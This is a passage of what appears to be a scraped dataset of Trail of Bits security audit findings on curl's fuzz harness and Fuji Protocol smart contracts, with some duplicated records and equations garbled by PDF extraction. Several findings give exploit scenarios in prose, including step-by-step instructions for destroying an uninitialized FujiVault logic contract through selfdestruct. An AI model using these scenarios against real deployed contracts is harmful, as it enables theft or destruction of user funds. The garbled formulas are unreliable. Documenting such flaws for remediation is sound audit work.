Low", "Difficulty: Medium"]}, {"title": "1. OSS-Fuzz coverage silently dropped signicantly ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-curl-http3-securityreview.pdf", "body": "Between November 30, 2022 and December 1, 2022 , the fuzzing coverage for cURL in OSS-Fuzz dropped signicantly. By the end of November, cURL had over 50% line coverage and over 67% function coverage; however, in December, cURL fuzz runs reected a low 6.62% line coverage and 10.18% function coverage. Reviewing build logs and Git change history, we observed that this occurred after an OpenSSL version upgrade. The new OpenSSL version started installing the libssl.a static library on a dierent directory, lib64 , instead of the traditional lib folder. The cURL fuzz scripts did not expect nor support this alternate location and therefore built cURL without SSL support, which broke several expectations in the fuzzing harnesses. This signicant loss of coverage went undetected for over a year, as we observed that the coverage had not recovered by the time we started this engagement in December 2023. The team submitted a pull request to the curl_fuzzer repository to x the issue. Once it was merged, we observed the coverage started to increase again starting on December 15. By December 20, 2023 , coverage was up again and near the November 2022 values, with a 48.83% line coverage and 65.73% function coverage of cURL code. Recommendations Short term, frequently monitor coverage changes over time, especially after changes are merged in the curl_fuzzer repository. If a regression is identied, act as needed to resolve it and restore the fuzzing functionality. Consider modifying the harnesses to immediately fail if an operation that is supposed to always work, such as setting a static cURL option, fails. Long term, implement an automated system to monitor coverage changes in OSS-Fuzz and alert the maintainers if signicant changes are detected. Integrate tests in the curl_fuzzer CI to compare corpus coverage before and after changes, in order to detect regressions earlier on. 2. curl_fuzzer is ine\u0000ective Severity: Informational Diculty: Undetermined Type: Conguration Finding ID: TOB-CURLH3-2 Target: curl_fuzzer/curl_fuzzer.cc", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "1. OSS-Fuzz coverage silently dropped signicantly ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-curl-http3-securityreview.pdf", "body": "Between November 30, 2022 and December 1, 2022 , the fuzzing coverage for cURL in OSS-Fuzz dropped signicantly. By the end of November, cURL had over 50% line coverage and over 67% function coverage; however, in December, cURL fuzz runs reected a low 6.62% line coverage and 10.18% function coverage. Reviewing build logs and Git change history, we observed that this occurred after an OpenSSL version upgrade. The new OpenSSL version started installing the libssl.a static library on a dierent directory, lib64 , instead of the traditional lib folder. The cURL fuzz scripts did not expect nor support this alternate location and therefore built cURL without SSL support, which broke several expectations in the fuzzing harnesses. This signicant loss of coverage went undetected for over a year, as we observed that the coverage had not recovered by the time we started this engagement in December 2023. The team submitted a pull request to the curl_fuzzer repository to x the issue. Once it was merged, we observed the coverage started to increase again starting on December 15. By December 20, 2023 , coverage was up again and near the November 2022 values, with a 48.83% line coverage and 65.73% function coverage of cURL code. Recommendations Short term, frequently monitor coverage changes over time, especially after changes are merged in the curl_fuzzer repository. If a regression is identied, act as needed to resolve it and restore the fuzzing functionality. Consider modifying the harnesses to immediately fail if an operation that is supposed to always work, such as setting a static cURL option, fails. Long term, implement an automated system to monitor coverage changes in OSS-Fuzz and alert the maintainers if signicant changes are detected. Integrate tests in the curl_fuzzer CI to compare corpus coverage before and after changes, in order to detect regressions earlier on.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "2. curl_fuzzer is ine\u0000ective ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-curl-http3-securityreview.pdf", "body": "The curl_fuzzer harness displays signicantly worse coverage than other similar harnesses like curl_fuzzer_http . Upon inspecting the harness code and coverage logs, we observed that the harness consistently fails to set the allowed protocols list, as highlighted in gure 2.1. This list is overly broad, and contains protocols that cURL is not built to support, causing the setopt call to fail every time. The harness cannot proceed beyond this point and therefore does not achieve any interesting coverage. int fuzz_set_allowed_protocols (FUZZ_DATA *fuzz) { int rc = 0 ; const char *allowed_protocols = \"\" ; #ifdef FUZZ_PROTOCOLS_ALL /* Do not allow telnet currently as it accepts input from stdin. */ allowed_protocols = \"dict,file,ftp,ftps,gopher,gophers,http,https,imap,imaps,\" \"ldap,ldaps,mqtt,pop3,pop3s,rtmp,rtmpe,rtmps,rtmpt,rtmpte,rtmpts,\" \"rtsp,scp,sftp,smb,smbs,smtp,smtps,tftp\" ; #endif /* (...) */ FTRY(curl_easy_setopt(fuzz->easy, CURLOPT_PROTOCOLS_STR, allowed_protocols)); EXIT_LABEL : return rc; } Figure 2.1: The fuzzer harness fails to congure the allowed protocols ( curl-fuzzer/curl_fuzzer.cc#505577 ) Recommendations Short term, adjust the allowed_protocols list so that it contains only protocols supported by the cURL build under test. Long term, review the existing harnesses as time passes and cURL features change to ensure that they are still exercising code paths as expected. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "1. Anyone can destroy the FujiVault logic contract if its initialize function was not called during deployment ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "Anyone can destroy the FujiVault logic contract if its initialize function has not already been called. Calling initialize on a logic contract is uncommon, as usually nothing is gained by doing so. The deployment script does not call initialize on any logic contract. As a result, the exploit scenario detailed below is possible after deployment. This issue is similar to a bug in AAVE that found in 2020. OpenZeppelins hardhat-upgrades plug-in protects against this issue by disallowing the use of selfdestruct or delegatecall on logic contracts. However, the Fuji Protocol team has explicitly worked around these protections by calling delegatecall in assembly, which the plug-in does not detect. Exploit Scenario The Fuji contracts are deployed, but the initialize functions of the logic contracts are not called. Bob, an attacker, deploys a contract to the address alwaysSelfdestructs, which simply always executes the selfdestruct opcode. Additionally, Bob deploys a contract to the address alwaysSucceeds, which simply never reverts. Bob calls initialize on the FujiVault logic contract, thereby becoming its owner. To make the call succeed, Bob passes 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE as the value for the _collateralAsset and _borrowAsset parameters. He then calls FujiVaultLogic.setActiveProvider(alwaysSelfdestructs), followed by FujiVault.setFujiERC1155(alwaysSucceeds) to prevent an additional revert in the next and nal call. Finally, Bob calls FujiVault.deposit(1), sending 1 wei. This triggers a delegatecall to alwaysSelfdestructs, thereby destroying the FujiVault logic contract and making the protocol unusable until its proxy contract is upgraded. 14 Fuji Protocol Because OpenZeppelins upgradeable contracts do not check for a contracts existence before a delegatecall (TOB-FUJI-003), all calls to the FujiVault proxy contract now succeed. This leads to exploits in any protocol integrating the Fuji Protocol. For example, a call that should repay all debt will now succeed even if no debt is repaid. Recommendations Short term, do not use delegatecall to implement providers. See TOB-FUJI-002 for more information. Long term, avoid the use of delegatecall, as it is dicult to use correctly and can introduce vulnerabilities that are hard to detect. 15 Fuji Protocol", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "2. Providers are implemented with delegatecall ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The system uses delegatecall to execute an active provider's code on a FujiVault, making the FujiVault the holder of the positions in the borrowing protocol. However, delegatecall is generally error-prone, and the use of it introduced the high-severity nding TOB-FUJI-001. It is possible to make a FujiVault the holder of the positions in a borrowing protocol without using delegatecall. Most borrowing protocols include a parameter that species the receiver of tokens that represent a position. For borrowing protocols that do not include this type of parameter, tokens can be transferred to the FujiVault explicitly after they are received from the borrowing protocol; additionally, the tokens can be transferred from the FujiVault to the provider before they are sent to the borrowing protocol. These solutions are conceptually simpler than and preferred to the current solution. Recommendations Short term, implement providers without the use of delegatecall. Set the receiver parameters to the FujiVault, or transfer the tokens corresponding to the position to the FujiVault. Long term, avoid the use of delegatecall, as it is dicult to use correctly and can introduce vulnerabilities that are hard to detect. 16 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "3. Lack of contract existence check on delegatecall will result in unexpected behavior ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The VaultControlUpgradeable and Proxy contracts use the delegatecall proxy pattern. If the implementation contract is incorrectly set or self-destructed, the contract may not be able to detect failed executions. The VaultControlUpgradeable contract includes the _execute function, which users can invoke indirectly to execute a transaction to a _target address. This function does not check for contract existence before executing the delegatecall (gure 3.1). /** * @dev Returns byte response of delegatcalls */ function _execute(address _target, bytes memory _data) internal whenNotPaused returns (bytes memory response) { /* solhint-disable */ assembly { let succeeded := delegatecall(sub(gas(), 5000), _target, add(_data, 0x20), mload(_data), 0, 0) let size := returndatasize() response := mload(0x40) mstore(0x40, add(response, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(response, size) returndatacopy(add(response, 0x20), 0, size) switch iszero(succeeded) case 1 { // throw if delegatecall failed revert(add(response, 0x20), size) } } /* solhint-disable */ } 17 Fuji Protocol Figure 3.1: fuji-protocol/contracts/abstracts/vault/VaultBaseUpgradeable.sol#L93-L11 5 The Proxy contract, deployed by the @openzeppelin/hardhat-upgrades library, includes a payable fallback function that invokes the _delegate function when proxy calls are executed. This function is also missing a contract existence check (gure 3.2). /** * @dev Delegates the current call to `implementation`. * * This function does not return to its internall call site, it will return directly to the external caller. */ function _delegate(address implementation) internal virtual { // solhint-disable-next-line no-inline-assembly assembly { // Copy msg.data. We take full control of memory in this inline assembly // block because it will not return to Solidity code. We overwrite the // Solidity scratch pad at memory position 0. calldatacopy(0, 0, calldatasize()) // Call the implementation. // out and outsize are 0 because we don't know the size yet. let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0) // Copy the returned data. returndatacopy(0, 0, returndatasize()) switch result // delegatecall returns 0 on error. case 0 { revert(0, returndatasize()) } default { return(0, returndatasize()) } } } Figure 3.2: Proxy.sol#L16-L41 A delegatecall to a destructed contract will return success (gure 3.3). Due to the lack of contract existence checks, a series of batched transactions may appear to be successful even if one of the transactions fails. The low-level functions call, delegatecall and staticcall return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 3.3: A snippet of the Solidity documentation detailing unexpected behavior related to delegatecall Exploit Scenario Eve upgrades the proxy to point to an incorrect new implementation. As a result, each 18 Fuji Protocol delegatecall returns success without changing the state or executing code. Eve uses this to scam users. Recommendations Short term, implement a contract existence check before any delegatecall. Document the fact that suicide and selfdestruct can lead to unexpected behavior, and prevent future upgrades from using these functions. Long term, carefully review the Solidity documentation, especially the Warnings section, and the pitfalls of using the delegatecall proxy pattern. References  Contract Upgrade Anti-Patterns  Breaking Aave Upgradeability 19 Fuji Protocol", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "4. FujiVault.setFactor is unnecessarily complex and does not properly handle invalid input ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The FujiVault contracts setFactor function sets one of four state variables to a given value. Which state variable is set depends on the value of a string parameter. If an invalid value is passed, setFactor succeeds but does not set any of the state variables. This creates edge cases, makes writing correct code more dicult, and increases the likelihood of bugs. function setFactor( uint64 _newFactorA, uint64 _newFactorB, string calldata _type ) external isAuthorized { bytes32 typeHash = keccak256(abi.encode(_type)); if (typeHash == keccak256(abi.encode(\"collatF\"))) { collatF.a = _newFactorA; collatF.b = _newFactorB; } else if (typeHash == keccak256(abi.encode(\"safetyF\"))) { safetyF.a = _newFactorA; safetyF.b = _newFactorB; } else if (typeHash == keccak256(abi.encode(\"bonusLiqF\"))) { bonusLiqF.a = _newFactorA; bonusLiqF.b = _newFactorB; } else if (typeHash == keccak256(abi.encode(\"protocolFee\"))) { protocolFee.a = _newFactorA; protocolFee.b = _newFactorB; } } Figure 4.1: FujiVault.sol#L475-494 Exploit Scenario A developer on the Fuji Protocol team calls setFactor from another contract. He passes a type that is not handled by setFactor. As a result, code that is expected to set a state variable does nothing, resulting in a more severe vulnerability. 20 Fuji Protocol Recommendations Short term, replace setFactor with four separate functions, each of which sets one of the four state variables. Long term, avoid string constants that simulate enumerations, as they cannot be checked by the typechecker. Instead, use enums and ensure that any code that depends on enum values handles all possible values. 21 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "5. Preconditions specied in docstrings are not checked by functions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The docstrings of several functions specify preconditions that the functions do not automatically check for. For example, the docstring of the FujiVault contracts setFactor function contains the preconditions shown in gure 5.1, but the functions body does not contain the corresponding checks shown in gure 5.2. * For safetyF; Sets Safety Factor of Vault, should be > 1, a/b * For collatF; Sets Collateral Factor of Vault, should be > 1, a/b Figure 5.1: FujiVault.sol#L469-470 require(safetyF.a > safetyF.b); ... require(collatF.a > collatF.b); Figure 5.2: The checks that are missing from FujiVault.setFactor Additionally, the docstring of the Controller contracts doRefinancing function contains the preconditions shown in gure 5.3, but the functions body does not contain the corresponding checks shown in gure 5.4. * @param _ratioB: _ratioA/_ratioB <= 1, and > 0 Figure 5.3: Controller.sol#L41 require(ratioA > 0 && ratioB > 0); require(ratioA <= ratioB); Figure 5.4: The checks that are missing from Controller.doRefinancing Exploit Scenario The setFactor function is called with values that violate its documented preconditions. Because the function does not check for these preconditions, unexpected behavior occurs. 22 Fuji Protocol Recommendations Short term, add checks for preconditions to all functions with preconditions specied in their docstrings. Long term, ensure that all documentation and code are in sync. 23 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "6. The FujiERC1155.burnBatch function implementation is incorrect ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The FujiERC1155 contracts burnBatch function deducts the unscaled amount from the user's balance and from the total supply of an asset. If the liquidity index of an asset (index[assetId]) is dierent from its initialized value, the execution of burnBatch could result in unintended arithmetic calculations. Instead of deducting the amount value, the function should deduct the amountScaled value. function burnBatch( address _account, uint256[] memory _ids, uint256[] memory _amounts ) external onlyPermit { require(_account != address(0), Errors.VL_ZERO_ADDR_1155); require(_ids.length == _amounts.length, Errors.VL_INPUT_ERROR); address operator = _msgSender(); uint256 accountBalance; uint256 assetTotalBalance; uint256 amountScaled; for (uint256 i = 0; i < _ids.length; i++) { uint256 amount = _amounts[i]; accountBalance = _balances[_ids[i]][_account]; assetTotalBalance = _totalSupply[_ids[i]]; amountScaled = _amounts[i].rayDiv(indexes[_ids[i]]); require(amountScaled != 0 && accountBalance >= amountScaled, Errors.VL_INVALID_BURN_AMOUNT); _balances[_ids[i]][_account] = accountBalance - amount; _totalSupply[_ids[i]] = assetTotalBalance - amount; } emit TransferBatch(operator, _account, address(0), _ids, _amounts); } Figure 6.1: FujiERC1155.sol#L218-247 24 Fuji Protocol Exploit Scenario The burnBatch function is called with an asset for which the liquidity index is dierent from its initialized value. Because amount was used instead of amountScaled, unexpected behavior occurs. Recommendations Short term, revise the burnBatch function so that it uses amountScaled instead of amount when updating a users balance and the total supply of an asset. Long term, use the burn function in the burnBatch function to keep functionality consistent. 25 Fuji Protocol", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "7. Error in the white papers equation for the cost of renancing ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The white paper uses the following equation (equation 4) to describe how the cost of renancing is calculated:    =  +   +   +   +     is the amount of debt to be renanced and is a summand of the equation. This is incorrect, as it implies that the renancing cost is always greater than the amount of debt to be renanced. A correct version of the equation could be   is an amount, or     =  +    +  +  +   = +   +   *      , in which  is a  , in which  percentage. Recommendations Short term, x equation 4 in the white paper. Long term, ensure that the equations in the white paper are correct and in sync with the implementation. 26 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "8. Errors in the white papers equation for index calculation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The white paper uses the following equation (equation 1) to describe how the index for a given token at timestamp is calculated:    =  1 + ( 1 )/    1  is the amount of the given token that the Fuji Protocol owes the provider (the borrowing  protocol) at timestamp . The index is updated only when the balance changes through the accrual of interest, not when the balance changes through borrowing or repayment operations. This means that    is always negative, which is incorrect, as  should calculate the )/    ( 1 1 1 interest rate since the last index update. *  3 *  2 * ... *  . A user's current balance is computed by taking the users initial stored  The index represents the total interest rate since the deployment of the protocol. It is the product of the various interest rates accrued on the active providers during the lifetime of the protocol (measured only during state-changing interactions with the provider):  1 balance, multiplying it by the current index, and dividing it by the index at the time of the creation of that user's position. The division operation ensures that the user will not owe interest that accrued before the creation of the users position. The index provides an ecient way to keep track of interest rates without having to update each user's balance separately, which would be prohibitively expensive on Ethereum. However, interest is compounded through multiplication, not addition. The formula should use the product sign instead of the plus sign. 27 Fuji Protocol Exploit Scenario Alice decides to use the Fuji Protocol after reading the white paper. She later learns that calculations in the white paper do not match the implementations in the protocol. Because Alice allocated her funds based on her understanding of the specication, she loses funds. Recommendations Short term, replace equation 1 in the white paper with a correct and simplied version. For more information on the simplied version, see nding TOB-FUJI-015.   =  1 / *   1 Long term, ensure that the equations in the white paper are correct and in sync with the implementation. 28 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Undetermined"]}, {"title": "9. FujiERC1155.setURI does not adhere to the EIP-1155 specication ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The FujiERC1155 contracts setURI function does not emit the URI event. /** * @dev Sets a new URI for all token types, by relying on the token type ID */ function setURI(string memory _newUri) public onlyOwner { _uri = _newUri; } Figure 9.1: FujiERC1155.sol#L266-268 This behavior does not adhere to the EIP-1155 specication, which states the following: Changes to the URI MUST emit the URI event if the change can be expressed with an event (i.e. it isnt dynamic/programmatic). Figure 9.2: A snippet of the EIP-1155 specication Recommendations Short term, revise the setURI function so that it emits the URI event. Long term, review the EIP-1155 specication to verify that the contracts adhere to the standard. References  EIP-1155 29 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "10. Partial renancing operations can break the protocol ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The white paper documents the Controller contracts ability to perform partial renancing operations. These operations move only a fraction of debt and collateral from one provider to another to prevent unprotable interest rate slippage. However, the protocol does not correctly support partial renancing situations in which debt and collateral are spread across multiple providers. For example, payback and withdrawal operations always interact with the current provider, which might not contain enough funds to execute these operations. Additionally, the interest rate indexes are computed only from the debt owed to the current provider, which might not accurately reect the interest rate across all providers. Exploit Scenario An executor performs a partial renancing operation. Interest rates are computed incorrectly, resulting in a loss of funds for either the users or the protocol. Recommendations Short term, disable partial renancing until the protocol supports it in all situations. Long term, ensure that functionality that is not fully supported by the protocol cannot be used by accident. 30 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "11. Native support for ether increases the codebases complexity ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The protocol supports ERC20 tokens and Ethereums native currency, ether. Ether transfers follow dierent semantics than token transfers. As a result, many functions contain extra code, like the code shown in gure 11.1, to handle ether transfers. if (vAssets.borrowAsset == ETH) { require(msg.value >= amountToPayback, Errors.VL_AMOUNT_ERROR); if (msg.value > amountToPayback) { IERC20Upgradeable(vAssets.borrowAsset).univTransfer( payable(msg.sender), msg.value - amountToPayback ); } } else { // Check User Allowance require( IERC20Upgradeable(vAssets.borrowAsset).allowance(msg.sender, address(this)) >= amountToPayback, Errors.VL_MISSING_ERC20_ALLOWANCE ); Figure 11.1: FujiVault.sol#L319-333 This extra code increases the codebases complexity. Furthermore, functions will behave dierently depending on their arguments. Recommendations Short term, replace native support for ether with support for ERC20 WETH. This will decrease the complexity of the protocol and the likelihood of bugs. 31 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "12. Missing events for critical operations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "Many functions that make important state changes do not emit events. These functions include, but are not limited to, the following:  All setters in the FujiAdmin contract  The setFujiAdmin, setFujiERC1155, setFactor, setOracle, and setProviders functions in the FujiVault contract  The setMapping and setURI functions in the FujiMapping contract  The setFujiAdmin and setExecutors functions in the Controller contract  The setURI and setPermit functions in the FujiERC1155 contract  The setPriceFeed function in the FujiOracle contract Exploit scenario An attacker gains permission to execute an operation that changes critical protocol parameters. She executes the operation, which does not emit an event. Neither the Fuji Protocol team nor the users are notied about the parameter change. The attacker uses the changed parameter to steal funds. Later, the attack is detected due to the missing funds, but it is too late to react and mitigate the attack. Recommendations Short term, ensure that all state-changing operations emit events. Long term, use an event monitoring system like Tenderly or Defender, use Defenders automated incident response feature, and develop an incident response plan to follow in case of an emergency. 32 Fuji Protocol 13. Indexes are not updated before all operations that require up-to-date indexes Severity: High Diculty: Low Type: Undened Behavior Finding ID: TOB-FUJI-013 Target: FujiVault.sol, FujiERC1155.sol, FLiquidator.sol", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "14. No protection against missing index updates before operations that depend on up-to-date indexes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The FujiERC1155 contract uses indexes to keep track of interest rates. Refer to Appendix F for more detail on the index calculation. The FujiVault contracts updateF1155Balances function is responsible for updating indexes. This function must be called before all operations that read indexes (TOB-FUJI-013). However, the protocol does not protect against situations in which indexes are not updated before they are read; these situations could result in incorrect accounting. Exploit Scenario Developer Bob adds a new operation that reads indexes, but he forgets to add a call to updateF1155Balances. As a result, the new operation uses outdated index values, which causes incorrect accounting. Recommendations Short term, redesign the index calculations so that they provide protection against the reading of outdated indexes. For example, the index calculation process could keep track of the last index updates block number and access indexes exclusively through a getter, which updates the index automatically, if it has not already been updated for the current block. Since ERC-1155s balanceOf and totalSupply functions do not allow side eects, this solution would require the use of dierent functions internally. Long term, use defensive coding practices to ensure that critical operations are always executed when required. 34 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "15. Formula for index calculation is unnecessarily complex ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "Indexes are updated within the FujiERC1155 contracts updateState function, shown in gure 15.1. Refer to Appendix F for more detail on the index calculation. function updateState(uint256 _assetID, uint256 newBalance) external override onlyPermit { uint256 total = totalSupply(_assetID); if (newBalance > 0 && total > 0 && newBalance > total) { uint256 diff = newBalance - total; uint256 amountToIndexRatio = (diff.wadToRay()).rayDiv(total.wadToRay()); uint256 result = amountToIndexRatio + WadRayMath.ray(); result = result.rayMul(indexes[_assetID]); require(result <= type(uint128).max, Errors.VL_INDEX_OVERFLOW); indexes[_assetID] = uint128(result); // TODO: calculate interest rate for a fujiOptimizer Fee. } } Figure 15.1: FujiERC1155.sol#L40-57 The code in gure 14.1 translates to the following equation: =    1 * (1 + (    )/ 1 ) 1 Using the distributive property, we can transform this equation into the following: =    1 / * (1 +   1 This version can then be simplied:   / 1 ) 1 =    1 / * (1 +   1  1) 35 Fuji Protocol Finally, we can simplify the equation even further: =    1 / *   1 The resulting equation is simpler and more intuitively conveys the underlying ideathat the index grows by the same ratio as the balance grew since the last index update. Recommendations Short term, use the simpler index calculation formula in the updateState function of the Fuji1155Contract. This will result in code that is more intuitive and that executes using slightly less gas. Long term, use simpler versions of the equations used by the protocol to make the arithmetic easier to understand and implement correctly. 36 Fuji Protocol 16. Flashers initiateFlashloan function does not revert on invalid ashnum values Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-FUJI-016 Target: Flasher.sol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Undetermined"]}, {"title": "17. Docstrings do not reect functions implementations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The docstring of the FujiVault contracts withdraw function states the following: * @param _withdrawAmount: amount of collateral to withdraw * otherwise pass -1 to withdraw maximum amount possible of collateral (including safety factors) Figure 17.1: FujiVault.sol#L188-189 However, the maximum amount is withdrawn on any negative value, not only on a value of -1. A similar inconsistency between the docstring and the implementation exists in the FujiVault contracts payback function. Recommendations Short term, adjust the withdraw and payback functions docstrings or their implementations to make them match. Long term, ensure that docstrings always match the corresponding functions implementation. 38 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Undetermined"]}, {"title": "18. Harvesters getHarvestTransaction function does not revert on invalid _farmProtocolNum and harvestType values ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The Harvester contracts getHarvestTransaction function incorrectly returns claimedToken and transaction values of 0 if the _farmProtocolNum parameter is set to a value greater than 1 or if the harvestType value is set to value greater than 2. However, the function does not revert on invalid _farmProtocolNum and harvestType values. function getHarvestTransaction(uint256 _farmProtocolNum, bytes memory _data) external view override returns (address claimedToken, Transaction memory transaction) { if (_farmProtocolNum == 0) { transaction.to = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B; transaction.data = abi.encodeWithSelector( bytes4(keccak256(\"claimComp(address)\")), msg.sender ); claimedToken = 0xc00e94Cb662C3520282E6f5717214004A7f26888; } else if (_farmProtocolNum == 1) { uint256 harvestType = abi.decode(_data, (uint256)); if (harvestType == 0) { // claim (, address[] memory assets) = abi.decode(_data, (uint256, address[])); transaction.to = 0xd784927Ff2f95ba542BfC824c8a8a98F3495f6b5; transaction.data = abi.encodeWithSelector( bytes4(keccak256(\"claimRewards(address[],uint256,address)\")), assets, type(uint256).max, msg.sender ); } else if (harvestType == 1) { // transaction.to = 0x4da27a545c0c5B758a6BA100e3a049001de870f5; transaction.data = abi.encodeWithSelector(bytes4(keccak256(\"cooldown()\"))); } else if (harvestType == 2) { // transaction.to = 0x4da27a545c0c5B758a6BA100e3a049001de870f5; 39 Fuji Protocol transaction.data = abi.encodeWithSelector( bytes4(keccak256(\"redeem(address,uint256)\")), msg.sender, type(uint256).max ); claimedToken = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9; } } } Figure 18.1: Harvester.sol#L13-54 Exploit Scenario Alice, an executor of the Fuji Protocol, calls getHarvestTransaction with the _farmProtocolNum parameter set to 2. As a result, rather than reverting, the function returns claimedToken and transaction values of 0. Recommendations Short term, revise getHarvestTransaction so that it reverts if it is called with invalid farmProtocolNum or harvestType values. Long term, ensure that all functions revert if they are called with invalid values. 40 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "19. Lack of data validation in Controllers doRenancing function ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The Controller contracts doRefinancing function does not check the _newProvider value. Therefore, the function accepts invalid values for the _newProvider parameter. function doRefinancing( address _vaultAddr, address _newProvider, uint256 _ratioA, uint256 _ratioB, uint8 _flashNum ) external isValidVault(_vaultAddr) onlyOwnerOrExecutor { IVault vault = IVault(_vaultAddr); [...] [...] IVault(_vaultAddr).setActiveProvider(_newProvider); } Figure 19.1: Controller.sol#L44-84 Exploit Scenario Alice, an executor of the Fuji Protocol, calls Controller.doRefinancing with the _newProvider parameter set to the same address as the active provider. As a result, unnecessary ash loan fees will be paid. Recommendations Short term, revise the doRefinancing function so that it reverts if _newProvider is set to the same address as the active provider. Long term, ensure that all functions revert if they are called with invalid values. 41 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "20. Lack of data validation on function parameters ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "Certain setter functions fail to validate the addresses they receive as input. The following addresses are not validated:  The addresses passed to all setters in the FujiAdmin contract  The _newFujiAdmin address in the setFujiAdmin function in the Controller and FujiVault contracts  The _provider address in the FujiVault.setActiveProvider function  The _oracle address in the FujiVault.setOracle function  The _providers addresses in the FujiVault.setProviders function  The newOwner address in the transferOwnership function in the Claimable and ClaimableUpgradeable contracts Exploit scenario Alice, a member of the Fuji Protocol team, invokes the FujiVault.setOracle function and sets the oracle address as address(0). As a result, code relying on the oracle address is no longer functional. Recommendations Short term, add zero-value or contract existence checks to the functions listed above to ensure that users cannot accidentally set incorrect values, misconguring the protocol. Long term, use Slither, which will catch missing zero checks. 42 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "12. Missing events for critical operations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "Many functions that make important state changes do not emit events. These functions include, but are not limited to, the following:  All setters in the FujiAdmin contract  The setFujiAdmin, setFujiERC1155, setFactor, setOracle, and setProviders functions in the FujiVault contract  The setMapping and setURI functions in the FujiMapping contract  The setFujiAdmin and setExecutors functions in the Controller contract  The setURI and setPermit functions in the FujiERC1155 contract  The setPriceFeed function in the FujiOracle contract Exploit scenario An attacker gains permission to execute an operation that changes critical protocol parameters. She executes the operation, which does not emit an event. Neither the Fuji Protocol team nor the users are notied about the parameter change. The attacker uses the changed parameter to steal funds. Later, the attack is detected due to the missing funds, but it is too late to react and mitigate the attack. Recommendations Short term, ensure that all state-changing operations emit events. Long term, use an event monitoring system like Tenderly or Defender, use Defenders automated incident response feature, and develop an incident response plan to follow in case of an emergency. 32 Fuji Protocol", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "13. Indexes are not updated before all operations that require up-to-date indexes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf", "body": "The FujiERC1155 contract uses indexes to keep track of interest rates. Refer to Appendix F for more detail on the index calculation. The FujiVault contracts updateF1155Balances function is responsible for updating indexes. However, this function is not called before all operations that read indexes. As a result, these operations use outdated indexes, which results in incorrect accounting and could make the protocol vulnerable to exploits. FujiVault.deposit calls FujiERC1155._mint, which reads indexes but does not call updateF1155Balances. FujiVault.paybackLiq calls FujiERC1155.balanceOf, which reads indexes but does not call updateF1155Balances. Exploit Scenario The indexes have not been updated in one day. User Bob deposits collateral into the FujiVault. Day-old 